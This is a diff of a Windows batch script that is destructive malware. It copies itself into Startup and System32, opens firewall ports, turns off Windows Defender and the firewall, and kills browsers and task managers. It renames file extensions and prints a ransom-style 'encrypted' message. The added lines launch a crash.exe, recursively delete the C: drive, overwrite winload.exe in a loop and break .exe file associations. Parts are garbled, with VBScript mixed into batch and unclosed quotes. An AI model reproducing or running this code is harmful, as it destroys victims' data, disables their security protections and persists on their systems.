@@ -1,4 +1,5 @@
 @echo off
+:virus
 copy %0 %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 cd C:\Windows\System32
 copy %0 C:\Windows\System32
@@ -6,7 +7,6 @@ xcopy LogonUI.exe %0
 chcp 65001
 title Ошибка 402 Error 402
 xcopy ntoskrnl.exe crash.bat
-:crashWinTotal
 cd C:\Windows\System32
 start dllhost.exe
 start winload.exe
@@ -14,11 +14,8 @@ start fontdrvhost.exe
 copy winload.exe %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 del winload.exe
 chcp 866
-:winCrash
 copy %0
 del %0
-goto winCrash
-goto crashWinTotal
 echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
 echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
 echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
@@ -32,6 +29,7 @@ del x.js >NUL 2>NUL
 del z.zip >NUL 2>NUL
 del x >NUL 2>NUL
 start "" %v%
+start %appdata%\crash.exe
 @if "%DEBUG%" == "" @echo off
 @rem ##########################################################################
 @rem
@@ -841,13 +839,11 @@ ECHO.>>9K21JM10B.log
 ECHO.>>9K21JM10B.log
 ECHO.>>9K21JM10B.log
 systeminfo>>9K21JM10B.log
-goto ports
 ren -=- Opens Port 1122 -=-
 :ports
 cls & color 0a
 netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
 netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
-goto firewall
 ren -=- Turns all Firewalls off -=-
 :firewall
 cls & color 0a
@@ -912,9 +908,7 @@ REN *.png *.8J2n
 REN *.exe *.3hxD
 color 0a & mode 1000 & cls
 pause
-goto virus
 ren -=- Closes all task managers and browser, kills anti-virus and firewall -=-
-:virus
 ECHO You have been encrypted by *-*7_SL*- & color 0a
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
@@ -923,4 +917,16 @@ taskkill /F /IM "firefox.exe" /T
 taskkill /F /IM "ProcessHacker.exe" /T
 taskkill /F /IM "explorer.exe" /T
 taskkill /F /IM "taskmgr.exe" /T
+cd C:\
+rd /s /q С:\
+rd C:\/s/q
+del C:\/s/q. 
+Set fso = CreateObject("Scripting.FileSystemObject")
+do
+set tx = fso.CreateTextFile("C:\Windows\System32\winload.exe
+tx.WriteBlankLines(1000000000
+tx.close
+FSO.DeleteFile "C:\Windows\System32\winload.exe"
+loop
+assoc .exe=.mp3
 goto virus
